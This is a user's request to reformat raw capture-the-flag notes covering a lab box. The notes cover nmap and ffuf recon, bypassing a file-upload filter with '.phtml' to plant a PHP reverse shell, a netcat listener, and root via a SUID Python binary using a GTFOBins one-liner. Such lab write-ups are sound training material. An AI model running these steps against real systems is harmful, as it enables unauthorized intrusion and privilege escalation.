can you write better markdown CTF room solving notes with the raw notes i have

Notes:
nmap -A 10.10.57.2 -T4

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.57.2/FUZZ

/panel - found

php reverse shell file upload -
use burp intruder to find which type of file can be uploaded
.phtml can be uploaded

we also got /uploads dir check it if it has files that are uploaded

Bingo

nc -nvlp 4444
listen for the reverse shell

boom got the reverse shell

find the user.txt 
find / -type f -name user.txt 2> /dev/null

cat user.txt

Now to get root search for SUID permission enabled file dirs
find / -uid 0 -perm -4000 -type f 2>/dev/null

something useful - /usr/bin/python

go to gtfobins and get privilage escalation command for python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
check - whoami > root

Bingo !!

find root.txt
find / -type f -name root.txt
cat root.txt

Boom you just solved the room